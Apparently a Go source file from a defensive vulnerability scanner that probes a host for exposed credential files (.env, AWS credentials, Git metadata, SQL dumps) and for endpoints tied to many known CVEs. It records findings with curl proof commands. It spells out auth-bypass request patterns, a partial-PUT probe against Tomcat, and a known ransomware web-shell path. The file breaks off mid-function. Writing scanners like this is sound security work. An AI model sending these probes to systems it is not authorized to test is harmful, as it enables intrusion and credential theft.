// Package exposedfiles actively probes for sensitive configuration files,
// credentials, and secrets exposed over HTTP. It complements the passive
// dorks and historicalurls scanners with direct, authoritative probes.
//
// Surface mode: probes high-confidence, low-false-positive paths.
// Deep mode: probes an extended list including framework-specific paths.
package exposedfiles

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane/beacon/internal/finding"
	"github.com/stormbane/beacon/internal/module"
)

const scannerName = "exposedfiles"

type sensitiveFile struct {
	path        string
	title       string
	severity    finding.Severity
	deepOnly    bool
	// bodyContains confirms it's real (not a soft 404) by checking for this substring.
	bodyContains string
	// checkID overrides the default "exposure.sensitive_file" check ID.
	// Use for CVE-specific probes that need their own tracking identity.
	checkID string
	// description overrides the default generic description when set.
	description string
}

var targets = []sensitiveFile{
	// Critical — credential / secret files
	{path: "/.env", title: "Exposed .env file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.local", title: "Exposed .env.local file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.production", title: "Exposed .env.production file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/.env.backup", title: "Exposed .env.backup file", severity: finding.SeverityCritical, bodyContains: "="},
	{path: "/config/database.yml", title: "Exposed database config (Rails)", severity: finding.SeverityCritical, bodyContains: "password"},
	{path: "/config/secrets.yml", title: "Exposed secrets file (Rails)", severity: finding.SeverityCritical, bodyContains: "secret"},
	{path: "/app/config/parameters.yml", title: "Exposed Symfony parameters", severity: finding.SeverityCritical, bodyContains: "database"},
	{path: "/.aws/credentials", title: "Exposed AWS credentials file", severity: finding.SeverityCritical, bodyContains: "aws_"},
	{path: "/wp-config.php.bak", title: "Exposed WordPress config backup", severity: finding.SeverityCritical, deepOnly: true},
	{path: "/configuration.php.bak", title: "Exposed Joomla config backup", severity: finding.SeverityCritical, deepOnly: true},
	{path: "/.docker/config.json", title: "Exposed Docker registry credentials", severity: finding.SeverityCritical, bodyContains: "auth"},

	// High — source control exposure
	{path: "/.git/config", title: "Exposed .git/config (repo metadata)", severity: finding.SeverityHigh, bodyContains: "[core]"},
	{path: "/.git/HEAD", title: "Exposed .git/HEAD (Git repository)", severity: finding.SeverityHigh, bodyContains: "ref:"},
	{path: "/.svn/entries", title: "Exposed Subversion repository", severity: finding.SeverityHigh},
	{path: "/.hg/hgrc", title: "Exposed Mercurial repository", severity: finding.SeverityHigh},

	// High — database and backup files
	{path: "/dump.sql", title: "Exposed SQL dump", severity: finding.SeverityHigh, bodyContains: "CREATE"},
	{path: "/backup.sql", title: "Exposed SQL backup", severity: finding.SeverityHigh, bodyContains: "INSERT"},
	{path: "/db.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},
	{path: "/database.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},
	{path: "/data.sqlite", title: "Exposed SQLite database", severity: finding.SeverityHigh},

	// High — package manager / dependency files (reveal software versions)
	{path: "/package.json", title: "Exposed package.json (dependency manifest)", severity: finding.SeverityMedium, bodyContains: "dependencies"},
	{path: "/composer.json", title: "Exposed composer.json (PHP dependencies)", severity: finding.SeverityMedium, bodyContains: "require"},
	{path: "/Gemfile", title: "Exposed Gemfile (Ruby dependencies)", severity: finding.SeverityMedium, bodyContains: "gem"},
	{path: "/requirements.txt", title: "Exposed requirements.txt (Python deps)", severity: finding.SeverityMedium},
	{path: "/go.sum", title: "Exposed go.sum (Go module checksums)", severity: finding.SeverityLow},

	// Medium — application config files
	{path: "/config.json", title: "Exposed config.json", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/config.yaml", title: "Exposed config.yaml", severity: finding.SeverityMedium},
	{path: "/config.yml", title: "Exposed config.yml", severity: finding.SeverityMedium},
	{path: "/settings.json", title: "Exposed settings.json", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/appsettings.json", title: "Exposed appsettings.json (.NET)", severity: finding.SeverityMedium, bodyContains: "{"},
	{path: "/application.properties", title: "Exposed Spring Boot properties", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/application.yml", title: "Exposed Spring Boot config", severity: finding.SeverityMedium, deepOnly: true},

	// Medium — log files
	{path: "/error.log", title: "Exposed error log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/access.log", title: "Exposed access log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/laravel.log", title: "Exposed Laravel log", severity: finding.SeverityMedium, deepOnly: true, bodyContains: "local.ERROR"},
	{path: "/storage/logs/laravel.log", title: "Exposed Laravel log", severity: finding.SeverityMedium, deepOnly: true},
	{path: "/var/log/app.log", title: "Exposed application log", severity: finding.SeverityMedium, deepOnly: true},

	// Info — fingerprinting / metadata
	{path: "/server-status", title: "Apache server-status exposed", severity: finding.SeverityMedium, bodyContains: "Apache"},
	{path: "/server-info", title: "Apache server-info exposed", severity: finding.SeverityMedium, bodyContains: "Apache"},
	{path: "/phpinfo.php", title: "PHP info page exposed", severity: finding.SeverityHigh, bodyContains: "phpinfo"},
	{path: "/info.php", title: "PHP info page exposed", severity: finding.SeverityHigh, bodyContains: "phpinfo"},

	// ── CVE-specific endpoint probes (Oct 2025 – Mar 2026 KEV wave) ──────────
	// HPE OneView — CVE-2025-37164 unauthenticated RCE (CVSS 10.0, KEV-listed).
	// /rest/version is accessible without authentication and returns a JSON object
	// including "currentVersion" that uniquely identifies HPE OneView.
	{
		path: "/rest/version", title: "HPE OneView REST API version exposed (CVE-2025-37164)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEHPEOneViewRCE,
		bodyContains: "currentVersion",
		description: "The HPE OneView management REST API /rest/version endpoint is accessible without authentication. " +
			"CVE-2025-37164 (CVSS 10.0, KEV-listed Jan 2026) allows pre-authentication remote code execution " +
			"via the /rest/id-pools/executeCommand API. A Metasploit module is publicly available. " +
			"Patch to HPE OneView 11.00 or later immediately.",
	},

	// Ivanti EPMM — CVE-2026-1281 + CVE-2026-1340 pre-auth OS command injection
	// (CVSS 9.8, KEV-listed Feb 2026). The MDM distribution path is uniquely Ivanti
	// EPMM and responds with 200 without authentication.
	{
		path: "/mifs/c/appstore/fob/", title: "Ivanti EPMM MDM endpoint exposed (CVE-2026-1281/1340)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEIvantiEPMMRCE,
		description: "The Ivanti Endpoint Manager Mobile (EPMM) in-house app distribution endpoint is internet-accessible. " +
			"CVE-2026-1281 and CVE-2026-1340 (CVSS 9.8, KEV-listed Feb 2026) allow pre-authentication OS command " +
			"injection via URL parameters passed to Bash arithmetic expansion. Ransomware operators actively exploit this. " +
			"Apply Ivanti EPMM patches released February 2026 immediately.",
	},

	// Cisco ASA / FTD — CVE-2025-20333 + CVE-2025-20362 chained pre-auth RCE.
	// The AnyConnect SSL VPN login page is unique to Cisco ASA/FTD devices.
	// bodyContains "webvpn" confirms it is genuine Cisco AnyConnect, not a redirect.
	{
		path: "/+CSCOE+/logon.html", title: "Cisco ASA/FTD AnyConnect VPN exposed (CVE-2025-20333/20362)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVECiscoASARCE,
		bodyContains: "webvpn",
		description: "A Cisco Adaptive Security Appliance (ASA) or Firewall Threat Defense (FTD) device with " +
			"AnyConnect SSL VPN is internet-accessible. CVE-2025-20333 (buffer overflow) chained with CVE-2025-20362 " +
			"(unauthenticated URL access) enables pre-authentication remote code execution on unpatched devices. " +
			"Both CVEs are KEV-listed. Apply Cisco security patches for ASA/FTD immediately.",
	},

	// Citrix NetScaler — CVE-2025-5777 (\"CitrixBleed 2\") pre-auth memory leak.
	// The NetScaler Gateway /vpn/index.html login page uniquely identifies this product.
	{
		path: "/vpn/index.html", title: "Citrix NetScaler Gateway login exposed (CVE-2025-5777)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVECitrixBleed2,
		bodyContains: "Citrix",
		description: "A Citrix NetScaler ADC or Gateway login page is internet-accessible. " +
			"CVE-2025-5777 (\"CitrixBleed 2\", CVSS 9.3, KEV-listed) is a pre-authentication memory leak in " +
			"the authentication handler. Sending a crafted POST to /p/u/doAuthentication.do causes the server " +
			"to return stack memory contents including session tokens within the XML response. " +
			"Upgrade to patched NetScaler versions immediately.",
	},

	// ── CVE-specific endpoint probes ──────────────────────────────────────────
	// Each probe targets a specific product version gap (KEV-listed or actively
	// exploited). Bodycontains validates the product is actually running, not
	// just that the path responds (soft-404 guard).

	// CVE-2026-27944 — Nginx-UI unauthenticated backup download + encryption key
	// disclosure. GET /api/backup without credentials returns the full archive and
	// exposes X-Backup-Security header. CVSS 9.8, no auth required.
	{
		path: "/api/backup", title: "Nginx-UI unauthenticated backup endpoint (CVE-2026-27944)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVENginxUIBackup,
		description: "The Nginx-UI /api/backup endpoint is accessible without authentication (CVE-2026-27944, CVSS 9.8). " +
			"It returns the full server configuration backup including SSL private keys and credentials. " +
			"The X-Backup-Security header in the response discloses the decryption key. " +
			"Update Nginx-UI to ≥ 2.3.2 immediately.",
	},

	// CVE-2026-1731 — BeyondTrust Remote Support / PRA pre-auth OS command injection.
	// /appliance/api/info exposes version without authentication; compare against
	// patched builds (RS > 25.3.1, PRA > 24.3.4). CVSS 9.9, KEV-listed Feb 2026.
	{
		path: "/appliance/api/info", title: "BeyondTrust Remote Support version exposed (CVE-2026-1731)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEBeyondTrustRCE,
		bodyContains: "version",
		description: "The BeyondTrust Remote Support / PRA version API is accessible without authentication. " +
			"CVE-2026-1731 (CVSS 9.9, KEV-listed) allows pre-authentication OS command injection on versions RS ≤ 25.3.1 and PRA ≤ 24.3.4. " +
			"Compare the disclosed version against patched builds and upgrade immediately.",
	},

	// CVE-2025-26399 — SolarWinds Web Help Desk AjaxProxy deserialization RCE.
	// The login page fingerprint confirms WHD; AjaxProxy path confirms exploitability.
	// CVSS 9.8, KEV-listed Mar 2026.
	{
		path: "/helpdesk/WebObjects/Helpdesk.woa/wo/", title: "SolarWinds Web Help Desk exposed (CVE-2025-26399)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVESolarWindsWHD,
		description: "SolarWinds Web Help Desk is internet-accessible. CVE-2025-26399 (CVSS 9.8, KEV-listed Mar 2026) " +
			"exploits unauthenticated Java deserialization in the AjaxProxy component. " +
			"Upgrade to WHD 12.8.7 HF1 or WHD 2026.1 immediately.",
	},

	// CVE-2026-1603 — Ivanti Endpoint Manager auth bypass → credential theft.
	// The /ams/ console path fingerprints Ivanti EPM. CVSS High, KEV-listed Mar 2026.
	{
		path: "/ams/", title: "Ivanti Endpoint Manager console exposed (CVE-2026-1603)",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEIvantiEPMAuthBypass,
		description: "Ivanti Endpoint Manager is internet-accessible. CVE-2026-1603 (KEV-listed Mar 2026) " +
			"allows authentication bypass via a specific API endpoint, exposing Domain Administrator " +
			"and service account credential blobs from the EPM Credential Vault. " +
			"Update to EPM 2024 SU5 or later immediately.",
	},

	// CVE-2024-1709 — ConnectWise ScreenConnect setup wizard auth bypass (CVSS 10.0, KEV).
	// /SetupWizard.aspx on patched versions redirects (302) to /. On vulnerable versions
	// (< 23.9.8) it returns 200 with the actual setup form, allowing admin account creation.
	{
		path: "/SetupWizard.aspx", title: "CVE-2024-1709: ConnectWise ScreenConnect setup wizard accessible",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEScreenConnectBypass,
		bodyContains: "ScreenConnect",
		description: "The ConnectWise ScreenConnect setup wizard (/SetupWizard.aspx) returned HTTP 200. " +
			"CVE-2024-1709 (CVSS 10.0, KEV) allows unauthenticated access to the setup wizard on " +
			"ScreenConnect < 23.9.8, letting an attacker create an admin account and take full control. " +
			"Upgrade to ScreenConnect 23.9.8 or later immediately.",
	},

	// CVE-2024-24919 — Check Point CloudGuard/Quantum arbitrary file read (CVSS 8.6, KEV).
	// /clients/MyCRL is specific to Check Point Mobile Access / SSL VPN blade.
	// A 200 response confirms the blade is exposed; path traversal exploitation is Deep mode.
	{
		path: "/clients/MyCRL", title: "CVE-2024-24919: Check Point Mobile Access blade exposed",
		severity: finding.SeverityHigh, checkID: finding.CheckCVECheckPointFileRead,
		description: "The Check Point Mobile Access / SSL VPN endpoint (/clients/MyCRL) is publicly accessible. " +
			"CVE-2024-24919 (CVSS 8.6, KEV) allows unauthenticated arbitrary file read via path traversal " +
			"in the Mobile Access blade. Attackers have used this to steal VPN credentials and private keys. " +
			"Apply hotfix immediately and restrict management access to trusted networks.",
	},

	// CVE-2024-47575 — FortiManager 'FortiJump' missing auth → rogue device registration (CVSS 9.8, KEV).
	// /p/login/ fingerprints the FortiManager web UI. The actual FGFM exploit uses port 541.
	{
		path: "/p/login/", title: "CVE-2024-47575: Fortinet FortiManager management portal exposed",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEFortiManagerJump,
		bodyContains: "FortiManager",
		description: "The Fortinet FortiManager management portal is internet-accessible. " +
			"CVE-2024-47575 (CVSS 9.8, KEV, 'FortiJump') — a missing authentication flaw in the FGFM " +
			"protocol — allowed threat actor UNC5820 to register rogue FortiGate devices and execute " +
			"arbitrary commands on managed devices. Restrict port 443 and port 541 to internal networks only.",
	},

	// CVE-2024-9463 — Palo Alto Expedition < 1.2.96 unauthenticated OS command injection (CVSS 9.9, KEV).
	// /api/v1/version returns version JSON without authentication; compare against 1.2.96 threshold.
	{
		path: "/api/v1/version", title: "CVE-2024-9463: Palo Alto Expedition version API exposed",
		severity: finding.SeverityCritical, checkID: finding.CheckCVEExpeditionRCE,
		bodyContains: "version",
		description: "The Palo Alto Expedition migration tool version API is publicly accessible. " +
			"CVE-2024-9463 (CVSS 9.9, KEV) allows unauthenticated OS command injection on Expedition < 1.2.96. " +
			"Expedition stores PAN-OS credentials and firewall configurations — compromise of this server " +
			"exposes all managed device credentials. Upgrade to 1.2.96 or later and isolate from the internet.",
	},

	// ── 2023 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2023-49103 — ownCloud graphapi phpinfo() credential disclosure (CVSS 10.0, KEV).
	// The graphapi app shipped a test file that calls phpinfo(), exposing all PHP env vars.
	// In containerized ownCloud deployments this includes OWNCLOUD_ADMIN_PASSWORD and DB credentials.
	{
		path: "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php",
		title:        "CVE-2023-49103: ownCloud phpinfo() exposes admin credentials",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEOwnCloudPhpInfo,
		bodyContains: "phpinfo",
		description: "The ownCloud graphapi test file GetPhpInfo.php is publicly accessible (CVE-2023-49103, CVSS 10.0, KEV). " +
			"It calls phpinfo(), exposing all PHP environment variables. In containerised ownCloud deployments " +
			"this includes OWNCLOUD_ADMIN_PASSWORD, OWNCLOUD_DB_PASSWORD, and mail credentials in plaintext. " +
			"Remove the graphapi app or upgrade to owncloud/graphapi ≥ 0.2.1 / ≥ 0.3.1 immediately.",
	},

	// CVE-2023-34362 — MOVEit Transfer SQL injection / CL0P web shell indicator (CVSS 9.8, KEV).
	// human2.aspx is the web shell installed by CL0P after exploiting MOVEit. Its presence
	// on a server with MOVEit indicates active or past compromise. bodyContains checks for
	// the shell's characteristic response rather than a generic HTML page.
	{
		path:     "/human2.aspx",
		title:    "CVE-2023-34362: MOVEit Transfer — CL0P web shell compromise indicator",
		severity: finding.SeverityCritical,
		checkID:  finding.CheckCVEMOVEitWebShell,
		description: "The file /human2.aspx is accessible on this server. This is the web shell installed " +
			"by the CL0P ransomware group after exploiting CVE-2023-34362 (MOVEit Transfer SQL injection, CVSS 9.8, KEV). " +
			"Its presence indicates the server was or is compromised. Immediately engage incident response, " +
			"audit file uploads, reset credentials, and apply MOVEit patches.",
	},

	// CVE-2023-47246 — SysAid On-Prem path traversal → WAR upload → RCE (CVSS 9.8, KEV, Lace Tempest).
	// The SysAid login page at /Login.jsp fingerprints the product. Separate inline probe checks version.
	{
		path:         "/Login.jsp",
		title:        "CVE-2023-47246: SysAid On-Prem IT service desk exposed",
		severity:     finding.SeverityHigh,
		checkID:      finding.CheckCVESysAid,
		bodyContains: "SysAid",
		description: "SysAid On-Premises IT service management software is internet-accessible. " +
			"CVE-2023-47246 (CVSS 9.8, KEV, exploited by Lace Tempest / CL0P affiliates) allows unauthenticated " +
			"path traversal via the UserEntry servlet's accountID parameter, enabling WAR file upload to the " +
			"Tomcat webroot and subsequent remote code execution. Upgrade to SysAid On-Prem ≥ 23.3.36 immediately.",
	},

	// CVE-2023-36844/36845 — Juniper J-Web PHP environment variable injection → RCE (CVSS 9.8, KEV).
	// /webauth_operation.php is a specific J-Web endpoint that accepts unauthenticated requests.
	// If it returns HTTP 200, CVE-2023-36844 (env var injection via request params) applies.
	{
		path:         "/webauth_operation.php",
		title:        "CVE-2023-36844/36845: Juniper J-Web PHP injection endpoint accessible",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEJuniperJWeb,
		bodyContains: "Juniper",
		description: "The Juniper J-Web /webauth_operation.php endpoint is accessible without authentication. " +
			"CVE-2023-36844 (CVSS 9.8, KEV) allows PHP environment variable injection via unauthenticated " +
			"request parameters. Chained with CVE-2023-36845 (PHPRC injection), an attacker achieves " +
			"pre-authentication remote code execution on the Junos firewall or switch. " +
			"Upgrade to patched Junos OS versions and disable J-Web if not required.",
	},

	// ── 2022 CVE-specific endpoint probes ─────────────────────────────────────

	// CVE-2022-29464 — WSO2 API Manager / Identity Server unrestricted file upload (CVSS 9.8, KEV).
	// /carbon/admin/login.jsp fingerprints the WSO2 Management Console.
	{
		path:         "/carbon/admin/login.jsp",
		title:        "CVE-2022-29464: WSO2 Management Console exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEWSO2FileUpload,
		bodyContains: "WSO2",
		description: "The WSO2 Management Console (/carbon/admin/login.jsp) is internet-accessible. " +
			"CVE-2022-29464 (CVSS 9.8, KEV) is an unrestricted file upload vulnerability in WSO2 API Manager, " +
			"Identity Server, and related products that allows unauthenticated remote code execution via " +
			"a specially crafted POST to /fileupload/. Ransomware groups actively exploited this at scale. " +
			"Apply WSO2 security patches and restrict management console access to internal networks.",
	},

	// CVE-2022-22954 — VMware Workspace ONE Access FreeMarker SSTI → RCE (CVSS 9.8, KEV).
	// /SAAS/auth/login fingerprints Workspace ONE. The SSTI is in the deviceUdid parameter of
	// /catalog-portal/ui/oauth/verify; detecting the login page is sufficient to flag exposure.
	{
		path:         "/SAAS/auth/login",
		title:        "CVE-2022-22954: VMware Workspace ONE Access login exposed",
		severity:     finding.SeverityCritical,
		checkID:      finding.CheckCVEVMwareWorkspaceONE,
		bodyContains: "Workspace ONE",
		description: "VMware Workspace ONE Access (formerly VMware Identity Manager) is internet-accessible. " +
			"CVE-2022-22954 (CVSS 9.8, KEV) is a FreeMarker server-side template injection vulnerability " +
			"in the deviceUdid parameter of the OAuth verification endpoint, exploitable without authentication " +
			"for remote code execution. Multiple threat actors and ransomware groups exploited this immediately " +
			"after disclosure. Apply VMware VMSA-2022-0011 patches immediately.",
	},
}

// Scanner actively probes for exposed sensitive files.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	scheme := detectScheme(ctx, client, asset)
	base := scheme + "://" + asset

	// Wildcard / catch-all detection: probe a path that cannot exist on any
	// real application. If the server returns 200, it serves the same response
	// for every path (install script CDNs, catch-all SPA configs, etc.) and
	// all path-based findings would be false positives.
	if isCatchAll(ctx, client, base) {
		return nil, nil
	}

	var findings []finding.Finding

	for _, t := range targets {
		if t.deepOnly && scanType != module.ScanDeep {
			continue
		}

		u := base + t.path
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		// Confirm it's a real file, not a soft 404 or CMS catch-all.
		if t.bodyContains != "" && !strings.Contains(string(body), t.bodyContains) {
			continue
		}

		// Heuristic: if the body is an HTML page, it's almost certainly a soft 404.
		ct := resp.Header.Get("Content-Type")
		if strings.Contains(ct, "text/html") && t.bodyContains == "" {
			continue
		}

		// Store up to 2000 chars so the AI enrichment pipeline and DLP scanner
		// can see actual key/value pairs (most .env files fit in this window).
		snippet := string(body)
		if len(snippet) > 2000 {
			snippet = snippet[:2000] + "…"
		}

		checkID := finding.CheckExposureSensitiveFile
		if t.checkID != "" {
			checkID = t.checkID
		}
		desc := t.description
		if desc == "" {
			desc = fmt.Sprintf(
				"%s is publicly accessible at %s. This file may contain credentials, "+
					"secrets, or configuration data that enables further attacks.",
				t.path, u)
		}

		findings = append(findings, finding.Finding{
			CheckID:      checkID,
			Module:       "surface",
			Scanner:      scannerName,
			Severity:     t.severity,
			Title:        t.title,
			Description:  desc,
			Asset:        asset,
			ProofCommand: fmt.Sprintf("curl -s %s | head -50", u),
			Evidence: map[string]any{
				"url":     u,
				"path":    t.path,
				"snippet": snippet,
			},
		})
	}

	// CVE-2024-27198 (TeamCity auth bypass, CVSS 9.8, KEV):
	// GET /app/rest/server;.ico bypasses Spring Security filter chain on
	// TeamCity < 2023.11.4 and returns server XML with version information.
	if f := probeTeamCityAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2024-21762 (FortiOS SSL VPN, CVSS 9.6, KEV):
	// GET /remote/info returns JSON with version on FortiOS < 7.4.3 when
	// SSL VPN is enabled. Version < 7.4.3 is vulnerable to pre-auth RCE.
	if f := probeFortiOSSSLVPNVersion(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2024-4577 (PHP CGI arg injection, CVSS 9.8, KEV):
	// GET /?-v on a Windows IIS + PHP-CGI server returns PHP version output.
	// Any version < 8.1.29 / 8.2.20 / 8.3.8 is vulnerable.
	if f := probePHPCGIVersion(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-22515 (Confluence setup bypass, CVSS 10.0, KEV):
	// GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
	// returns 200 on vulnerable Confluence 8.0–8.5.1, enabling unauthenticated admin creation.
	if f := probeConfluenceSetup(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-22518 (Confluence restore bypass, CVSS 10.0, KEV):
	// GET /json/setup-restore.action returns 200 on unpatched Confluence, allowing
	// unauthenticated database restore which overwrites credentials.
	if f := probeConfluenceRestore(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-20198 (Cisco IOS XE BadCandy implant, CVSS 10.0, KEV):
	// POST /webui/logoutconfirm.html?logon_hash=1 returns an 18-byte hex string
	// if the BadCandy Lua implant is installed. Uncompromised devices return 404.
	if f := probeCiscoIOSXEImplant(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-46805 (Ivanti Connect Secure auth bypass, CVSS 8.2, KEV):
	// GET /api/v1/totp/user-backup-code/../../license/keys-status/ — path traversal
	// reaches an authenticated endpoint without credentials on vulnerable ICS instances.
	if f := probeIvantiConnectSecure(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-4966 (Citrix Bleed, CVSS 9.4, KEV):
	// GET /oauth/idp/.well-known/openid-configuration on a NetScaler Gateway confirms
	// the OIDC endpoint is exposed — the overlong-Host memory-leak attack targets this path.
	if f := probeCitrixBleed(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-1388 (F5 BIG-IP iControl REST auth bypass, CVSS 9.8, KEV):
	// GET /mgmt/shared/echo with X-F5-Auth-Token bypass header returns JSON on vulnerable BIG-IP.
	if f := probeF5BigIPAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-26134 (Confluence OGNL injection, CVSS 9.8, KEV):
	// GET /login.action fingerprints Confluence. Older Confluence (< 7.18.1 / 7.4.17)
	// is vulnerable to unauthenticated OGNL injection via HTTP URI path segments.
	if f := probeConfluenceOGNL(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2022-40684 (FortiOS/FortiProxy auth bypass, CVSS 9.8, KEV):
	// GET /api/v2/cmdb/system/admin with crafted Forwarded header bypasses auth on
	// FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1; FortiProxy 7.0.0–7.0.6, 7.2.0.
	if f := probeFortiOSAuthBypass(ctx, client, base, asset); f != nil {
		findings = append(findings, *f)
	}

	// CVE-2023-42793 (TeamCity /RPC2 bypass, CVSS 9.8, KEV, Deep only):
	// POST /app/rest/users/id:1/tokens/RPC2 bypasses auth on TeamCity < 2023.05.4
	// and returns an admin API token — distinct from CVE-2024-27198's path confusion.
	if scanType == module.ScanDeep {
		if f := probeTeamCityRPC2(ctx, client, base, asset); f != nil {
			findings = append(findings, *f)
		}
	}

	// CVE-2025-24813 (Deep only): Apache Tomcat partial PUT to .session path.
	// If Tomcat's DefaultServlet has partial PUT enabled (default in affected
	// versions) an attacker can upload an arbitrary file via Content-Range PUT,
	// then trigger deserialization by requesting the session ID that matches the
	// uploaded filename. The probe is a 1-byte partial PUT to a random .session
	// path — acceptance (201 Created) proves the vulnerability without exploiting it.
	if scanType == module.ScanDeep {
		if f := probeTomcatPartialPUT(ctx, client, base, asset); f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

// isCatchAll returns true when the server responds with 200 to a randomly
// named path that cannot exist on any real application. This detects install
// script CDNs, SPA catch-alls, and wildcard configs where every path returns
// the same content — path-based findings would all be false positives.
func isCatchAll(ctx context.Context, client *http.Client, base string) bool {
	u := base + "/beacon-probe-c4a7f2d9b3e1-doesnotexist"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

// probeTomcatPartialPUT tests for CVE-2025-24813 (Apache Tomcat partial PUT
// deserialization). It first fingerprints Tomcat via the Server header, then
// sends a 1-byte partial PUT to a random .session path. A 201 Created response
// means the DefaultServlet accepted the partial upload — the server is vulnerable.
// No deserialization is triggered; the temp file is never read back.
func probeTomcatPartialPUT(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Fingerprint: check Server header on root request.
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	server := strings.ToLower(resp.Header.Get("Server"))
	isTomcat := strings.Contains(server, "tomcat") || strings.Contains(server, "coyote")
	if !isTomcat {
		// Secondary fingerprint: /manager/html returns 401 on stock Tomcat.
		mReq, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/manager/html", nil)
		if err != nil {
			return nil
		}
		mResp, err := client.Do(mReq)
		if err != nil {
			return nil
		}
		mResp.Body.Close()
		// Tomcat returns 401 Unauthorized with WWW-Authenticate on /manager/html.
		wwwAuth := strings.ToLower(mResp.Header.Get("WWW-Authenticate"))
		isTomcat = mResp.StatusCode == http.StatusUnauthorized &&
			strings.Contains(wwwAuth, "tomcat")
	}
	if !isTomcat {
		return nil
	}

	// Probe: partial PUT to a random .session filename.
	sessionPath := fmt.Sprintf("/beacon-probe-%d.session", time.Now().UnixNano())
	u := base + sessionPath
	putReq, err := http.NewRequestWithContext(ctx, http.MethodPut, u,
		strings.NewReader("\x00"))
	if err != nil {
		return nil
	}
	putReq.Header.Set("Content-Type", "application/octet-stream")
	putReq.Header.Set("Content-Range", "bytes 0-0/100")
	putResp, err := client.Do(putReq)
	if err != nil {
		return nil
	}
	putResp.Body.Close()
	if putResp.StatusCode != http.StatusCreated {
		return nil
	}

	f := &finding.Finding{
		CheckID:  finding.CheckCVETomcatPartialPUT,
		Module:   "deep",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Title:    fmt.Sprintf("CVE-2025-24813: Apache Tomcat accepts partial PUT on .session path (%s)", asset),
		Description: fmt.Sprintf(
			"%s is running Apache Tomcat and accepted a partial PUT (Content-Range) request to "+
				"a .session path, returning HTTP 201 Created. "+
				"CVE-2025-24813 (CVSS 9.8, KEV) allows an attacker to upload a malicious Java "+
				"serialized object as a partial upload, then trigger deserialization by requesting "+
				"the session ID that matches the uploaded filename. This achieves remote code execution. "+
				"Affects Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2. "+
				"Upgrade to 9.0.99 / 10.1.35 / 11.0.3 or later and disable partial PUT if not required.",
			asset,
		),
		Asset: asset,
		Evidence: map[string]any{
			"url":             u,
			"put_status":      putResp.StatusCode,
			"content_range":   "bytes 0-0/100",
			"server":          resp.Header.Get("Server"),
		},
		ProofCommand: fmt.Sprintf(
			"curl -sk -X PUT '%s' -H 'Content-Range: bytes 0-0/100' -H 'Content-Type: application/octet-stream' -d $'\\x00' -o /dev/null -w '%%{http_code}'",
			u,
		),
		DiscoveredAt: time.Now(),
	}
	return f
}

// probeTeamCityAuthBypass tests for CVE-2024-27198 (JetBrains TeamCity < 2023.11.4,
// CVSS 9.8, KEV). The Spring Security filter chain can be bypassed by appending
// ;.ico to REST API paths. GET /app/rest/server;.ico returns XML with server
// version on vulnerable instances instead of the expected 401 Unauthorized.
func probeTeamCityAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Step 1: fingerprint TeamCity via the login page.
